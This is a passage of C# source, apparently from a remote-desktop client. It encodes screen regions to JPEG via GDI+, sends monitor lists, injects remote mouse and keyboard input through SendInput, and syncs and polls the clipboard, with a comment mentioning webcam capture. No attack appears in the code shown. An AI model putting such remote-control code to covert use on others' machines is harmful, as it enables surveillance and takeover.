        int stride = w * 4, rowLen = bw * 4;
        int off    = by * stride + bx * 4;
        for (int y = 0; y < bh; y++, off += stride)
            if (!cur.AsSpan(off, rowLen).SequenceEqual(prev.AsSpan(off, rowLen)))
                return true;
        return false;
    }

    // Encode a block region of the frame to JPEG.
    // Passes the frame stride directly to GDI+ — no per-block copy needed.
    // GDI+ reads bh rows of bw pixels, skipping (frameW-bw)*4 bytes at each row end.
    // Returns a pool-rented buffer; caller must use `length` for ToBase64 and return the array to ArrayPool.
    private static byte[]? EncodeBlock(byte[] pixels, int frameW, int frameH,
                                        int bx, int by, int bw, int bh, int quality, out int length)
    {
        length = 0;
        int srcStride = frameW * 4;
        nint gdipBmp = 0;
        unsafe
        {
            fixed (byte* p = &pixels[by * srcStride + bx * 4])
            {
                if (GdipCreateBitmapFromScan0(bw, bh, srcStride, 0x26200A, (nint)p, out gdipBmp) != 0
                    || gdipBmp == 0) return null;
                try   { return GdipBitmapToJpeg(gdipBmp, quality, out length); }
                finally { GdipDisposeImage(gdipBmp); }
            }
        }
    }

    // ── JPEG via GDI+ (file-based, no COM IStream) ────────────────────────────

    // Encode GDI+ bitmap to JPEG entirely in memory via SHCreateMemStream.
    // Encoder params are allocated locally per-call so this method is safe to call
    // from concurrent threads (RDP Parallel.For + webcam STA thread) with different
    // quality values — no shared mutable state, no use-after-free on _epParamsPtr.
    internal static byte[]? GdipBitmapToJpeg(nint bmp, int quality)
    {
        nint pStream = SHCreateMemStream(0, 0);
        if (pStream == 0) return null;
        try
        {
            // Use stack-pinned locals — GdipSaveImageToStream reads params synchronously, never stores pointer
            unsafe
            {
                int q   = Math.Clamp(quality, 1, 100);
                var ep  = new EncoderParam  { Guid = EncQuality, Count = 1, Type = 4, Value = (nint)(&q) };
                var eps = new EncoderParams { Count = 1, Param = ep };
                var clsid = JpegClsid;
                if (GdipSaveImageToStream(bmp, pStream, ref clsid, (nint)(&eps)) != 0) return null;
            }

            // IStream vtable: [0]=QI [1]=AddRef [2]=Release [3]=Read [4]=Write [5]=Seek
            nint vtbl  = Marshal.ReadIntPtr(pStream);
            var seekFn = _shSeekFn    ??= Marshal.GetDelegateForFunctionPointer<VtSeek>   (Marshal.ReadIntPtr(vtbl, 5 * nint.Size));
            var readFn = _shReadFn    ??= Marshal.GetDelegateForFunctionPointer<VtRead>   (Marshal.ReadIntPtr(vtbl, 3 * nint.Size));

            // Seek to END to get total byte count
            long streamLen = 0;
            seekFn(pStream, 0, 2, ref streamLen); // STREAM_SEEK_END=2 → streamLen = total bytes

            // Seek back to START — use a separate dummy so streamLen is not overwritten!
            long dummy = 0;
            seekFn(pStream, 0, 0, ref dummy);     // STREAM_SEEK_SET=0 → position = 0

            if (streamLen <= 0) return null;

            byte[] data = new byte[(int)streamLen];
            unsafe { fixed (byte* p = data) readFn(pStream, (nint)p, (uint)streamLen, out _); }
            return data;
        }
        catch { return null; }
        finally
        {
            nint vtbl2 = Marshal.ReadIntPtr(pStream);
            (_shReleaseFn ??= Marshal.GetDelegateForFunctionPointer<VtRelease>(Marshal.ReadIntPtr(vtbl2, 2 * nint.Size)))(pStream);
        }
    }

    // Pool-rented variant: caller must use `length` with Convert.ToBase64String(data, 0, length)
    // and return the array to ArrayPool<byte>.Shared after use.
    internal static byte[]? GdipBitmapToJpeg(nint bmp, int quality, out int length)
    {
        length = 0;
        nint pStream = SHCreateMemStream(0, 0);
        if (pStream == 0) return null;
        try
        {
            unsafe
            {
                int q   = Math.Clamp(quality, 1, 100);
                var ep  = new EncoderParam  { Guid = EncQuality, Count = 1, Type = 4, Value = (nint)(&q) };
                var eps = new EncoderParams { Count = 1, Param = ep };
                var clsid = JpegClsid;
                if (GdipSaveImageToStream(bmp, pStream, ref clsid, (nint)(&eps)) != 0) return null;
            }

            nint vtbl  = Marshal.ReadIntPtr(pStream);
            var seekFn = _shSeekFn ??= Marshal.GetDelegateForFunctionPointer<VtSeek>(Marshal.ReadIntPtr(vtbl, 5 * nint.Size));
            var readFn = _shReadFn ??= Marshal.GetDelegateForFunctionPointer<VtRead>(Marshal.ReadIntPtr(vtbl, 3 * nint.Size));

            long streamLen = 0;
            seekFn(pStream, 0, 2, ref streamLen);
            long dummy = 0;
            seekFn(pStream, 0, 0, ref dummy);

            if (streamLen <= 0) return null;

            var data = System.Buffers.ArrayPool<byte>.Shared.Rent((int)streamLen);
            unsafe { fixed (byte* p = data) readFn(pStream, (nint)p, (uint)streamLen, out _); }
            length = (int)streamLen;
            return data;
        }
        catch { return null; }
        finally
        {
            nint vtbl2 = Marshal.ReadIntPtr(pStream);
            (_shReleaseFn ??= Marshal.GetDelegateForFunctionPointer<VtRelease>(Marshal.ReadIntPtr(vtbl2, 2 * nint.Size)))(pStream);
        }
    }

    // ── Cached GDI objects for CaptureGdi — recreated only on dimension change ──
    private static nint _gdiHdcMem, _gdiHbm, _gdiHbmOld;
    private static nint _gdiHdcScl, _gdiHbmScl, _gdiHbmSclOld;
    private static int  _gdiCachedSrcW, _gdiCachedSrcH, _gdiCachedDstW, _gdiCachedDstH;

    // ── Cursor, monitors, GDI+ ────────────────────────────────────────────────

    private static void DrawCursor(nint hdcDst, int monX, int monY, int dstW, int dstH, int srcW, int srcH)
    {
        try
        {
            var ci = new CURSORINFO { cbSize = Marshal.SizeOf<CURSORINFO>() };
            if (!GetCursorInfo(out ci) || ci.flags != CURSOR_SHOWING) return;
            int cx = (ci.x - monX) * dstW / Math.Max(1, srcW);
            int cy = (ci.y - monY) * dstH / Math.Max(1, srcH);
            DrawIcon(hdcDst, cx, cy, ci.hCursor);
        }
        catch { }
    }

    // Composites the Win32 cursor into a raw BGRA pixel buffer (from DXGI capture).
    // Uses a cached DIBSection — DC and bitmap are created once and reused every frame,
    // eliminating per-frame GDI object alloc/free and GetDC/ReleaseDC kernel calls.
    private static unsafe void TryAddCursorToFrame(byte[] px, int w, int h, int monX, int monY)
    {
        try
        {
            var ci = new CURSORINFO { cbSize = Marshal.SizeOf<CURSORINFO>() };
            if (!GetCursorInfo(out ci) || ci.flags != CURSOR_SHOWING) return;
            int cx = ci.x - monX, cy = ci.y - monY;
            if (cx < -64 || cy < -64 || cx >= w || cy >= h) return;

            // (Re)create DC + DIBSection only when resolution changes
            if (_cursorDc == 0 || _cursorCacheW != w || _cursorCacheH != h)
            {
                if (_cursorBitmap != 0) { DeleteObject(_cursorBitmap); _cursorBitmap = 0; }
                if (_cursorDc    != 0) { DeleteDC(_cursorDc);          _cursorDc    = 0; }
                _cursorDc = CreateCompatibleDC(0); // 0 = screen-compatible, no GetDC needed
                if (_cursorDc == 0) return;
                var bmiInit = new BITMAPINFO
                {
                    bmiHeader = new BITMAPINFOHEADER
                    {
                        biSize = (uint)Marshal.SizeOf<BITMAPINFOHEADER>(),
                        biWidth = w, biHeight = -h, biPlanes = 1, biBitCount = 32
                    },
                    bmiColors = new uint[4]
                };
                _cursorBitmap = CreateDIBSection(_cursorDc, ref bmiInit, 0, out _cursorBits, 0, 0);
                if (_cursorBitmap == 0) { DeleteDC(_cursorDc); _cursorDc = 0; return; }
                SelectObject(_cursorDc, _cursorBitmap);
                _cursorCacheW = w; _cursorCacheH = h;
            }

            // Copy only the cursor-height band of rows instead of the full frame.
            // SM_CXCURSOR/SM_CYCURSOR give the system cursor size; ×2 covers high-DPI custom cursors.
            if (_cursorSysH < 0) _cursorSysH = GetSystemMetrics(14); // SM_CYCURSOR — cached
            int cursorH = Math.Min(_cursorSysH * 2, h);
            int rowBytes = w * 4;
            int patchY0  = Math.Max(0, cy);
            int patchY1  = Math.Min(h, cy + cursorH);
            int patchOff = patchY0 * rowBytes;
            int patchLen = (patchY1 - patchY0) * rowBytes;
            if (patchLen <= 0) return;
            fixed (byte* pPx = px)
            {
                byte* framePatch = pPx + patchOff;
                byte* dibPatch   = (byte*)_cursorBits + patchOff;
                Buffer.MemoryCopy(framePatch, dibPatch, patchLen, patchLen);
                DrawIcon(_cursorDc, cx, cy, ci.hCursor);
                Buffer.MemoryCopy(dibPatch, framePatch, patchLen, patchLen);
            }
        }
        catch { }
    }

    private static MonInfo[] EnumMonitors()
    {
        var list = new System.Collections.Generic.List<MonInfo>();
        EnumDisplayMonitors(0, 0, (hMon, _, _, _) =>
        {
            var mi = new MONITORINFOEX { cbSize = (uint)Marshal.SizeOf<MONITORINFOEX>() };
            if (GetMonitorInfoW(hMon, ref mi))
                list.Add(new MonInfo(mi.szDevice, mi.rcMonitor.left, mi.rcMonitor.top,
                    mi.rcMonitor.right - mi.rcMonitor.left, mi.rcMonitor.bottom - mi.rcMonitor.top));
            return true;
        }, 0);
        if (list.Count == 0)
            list.Add(new MonInfo("Primary", 0, 0, GetSystemMetrics(0), GetSystemMetrics(1)));
        return [.. list];
    }

    private static void EnsureGdiplus()
    {
        if (_gdipToken != 0) return;
        var inp = new GdiplusInput { Version = 1 };
        GdiplusStartup(out _gdipToken, ref inp, 0);
    }

    internal static void EnsureGdiplusPublic() => EnsureGdiplus();

    public static void SendMonitorListPublic(Func<int, string, System.Threading.Tasks.Task> send)
    {
        EnsureGdiplus();
        var mons = EnumMonitors();
        var sb = new System.Text.StringBuilder("{\"monitors\":[");
        for (int i = 0; i < mons.Length; i++)
        {
            if (i > 0) sb.Append(',');
            var m = mons[i];
            sb.Append("{\"i\":").Append(i)
              .Append(",\"name\":\"").Append(EscJ(m.Name)).Append('"')
              .Append(",\"x\":").Append(m.X)
              .Append(",\"y\":").Append(m.Y)
              .Append(",\"w\":").Append(m.W)
              .Append(",\"h\":").Append(m.H)
              .Append('}');
        }
        sb.Append("]}");
        send.Invoke((int)PacketType.RdpFrame, sb.ToString())
            .ContinueWith(_ => { }, System.Threading.Tasks.TaskContinuationOptions.None);
    }

    // ── Input ─────────────────────────────────────────────────────────────────

    public static void HandleInput(string json)
    {
        try
        {
            var t = Get(json, "T");
            int x = GetI(json, "X"), y = GetI(json, "Y");
            // GetSystemMetrics must run under per-monitor DPI awareness so it returns
            // physical pixels (matching the capture resolution), not logical/scaled values.
            nint oldDpi = SetThreadDpiAwarenessContext(-4);
            int sw = GetSystemMetrics(78), sh = GetSystemMetrics(79);
            int ox = GetSystemMetrics(76), oy = GetSystemMetrics(77);
            SetThreadDpiAwarenessContext(oldDpi);
            int ax = sw > 0 ? (x - ox) * 65535 / sw : x;
            int ay = sh > 0 ? (y - oy) * 65535 / sh : y;

            var inp = new INPUT { type = INPUT_MOUSE };
            switch (t)
            {
                case "mm":
                    inp.u.mi = new MOUSEINPUT { dx = ax, dy = ay, flags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK };
                    SendInput(1, [inp], Marshal.SizeOf<INPUT>());
                    break;
                case "mc":
                    int btn = GetI(json, "Button"); bool dn = Get(json, "Down") == "true";
                    uint f = btn == 1 ? (dn ? MOUSEEVENTF_RIGHTDOWN  : MOUSEEVENTF_RIGHTUP)
                           : btn == 2 ? (dn ? MOUSEEVENTF_MIDDLEDOWN : MOUSEEVENTF_MIDDLEUP)
                           :            (dn ? MOUSEEVENTF_LEFTDOWN   : MOUSEEVENTF_LEFTUP);
                    inp.u.mi = new MOUSEINPUT { dx = ax, dy = ay, flags = f | MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK };
                    SendInput(1, [inp], Marshal.SizeOf<INPUT>());
                    break;
                case "mw":
                    inp.u.mi = new MOUSEINPUT { data = (uint)GetI(json, "WheelDelta"), flags = MOUSEEVENTF_WHEEL };
                    SendInput(1, [inp], Marshal.SizeOf<INPUT>());
                    break;
                case "kk":
                    bool kdn = Get(json, "Down") == "true"; bool ext = Get(json, "Extended") == "true";
                    var ki = new INPUT { type = INPUT_KEYBOARD };
                    ki.u.ki = new KEYBDINPUT { wVk = (ushort)GetI(json, "VK"),
                        flags = (kdn ? 0u : KEYEVENTF_KEYUP) | (ext ? KEYEVENTF_EXTENDEDKEY : 0u) };
                    SendInput(1, [ki], Marshal.SizeOf<INPUT>());
                    break;
            }
        }
        catch { }
    }

    public static void HandleClipboard(string json)
    {
        try
        {
            var text = Get(json, "Text");
            if (string.IsNullOrEmpty(text)) return;
            if (!OpenClipboard(0)) return;
            try
            {
                EmptyClipboard();
                var bytes = System.Text.Encoding.Unicode.GetBytes(text + "\0");
                nint h = GlobalAlloc(GMEM_MOVEABLE, (nuint)bytes.Length);
                if (h == 0) return;
                nint p = GlobalLock(h);
                if (p == 0) { GlobalFree(h); return; }
                Marshal.Copy(bytes, 0, p, bytes.Length);
                GlobalUnlock(h);
                SetClipboardData(CF_UNICODETEXT, h);
                _lastClip = text;
            }
            finally { CloseClipboard(); }
        }
        catch { }
    }

    public static string? PollClipboard()
    {
        try
        {
            if (!OpenClipboard(0)) return null;
            try
            {
                nint h = GetClipboardData(CF_UNICODETEXT);
                if (h == 0) return null;
                nint p = GlobalLock(h);
                if (p == 0) return null;
                string s = Marshal.PtrToStringUni(p) ?? "";
                GlobalUnlock(h);
                if (s == _lastClip) return null;
                _lastClip = s;
                return s;
            }
            finally { CloseClipboard(); }
        }
        catch { return null; }
    }

    // ── JSON helpers ──────────────────────────────────────────────────────────

    private static string Get(string json, string key)
    {
        var pat = "\"" + key + "\"";
        int i = json.IndexOf(pat, StringComparison.Ordinal);
        if (i < 0) return "";
        int c = json.IndexOf(':', i + pat.Length);
        if (c < 0) return "";
        int s = c + 1;
        while (s < json.Length && json[s] == ' ') s++;
        if (s >= json.Length) return "";
        if (json[s] == '"')
        {
            int e = s + 1;
            while (e < json.Length && !(json[e] == '"' && json[e - 1] != '\\')) e++;
            return e >= json.Length ? "" : json.Substring(s + 1, e - s - 1);
        }
        int end = s;
        while (end < json.Length && json[end] != ',' && json[end] != '}') end++;
        return json.Substring(s, end - s).Trim();
    }

    private static int GetI(string json, string key)
        => int.TryParse(Get(json, key), out int v) ? v : 0;

    private static string EscJ(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

    internal static string ToBase64(byte[] d) => Convert.ToBase64String(d);
}
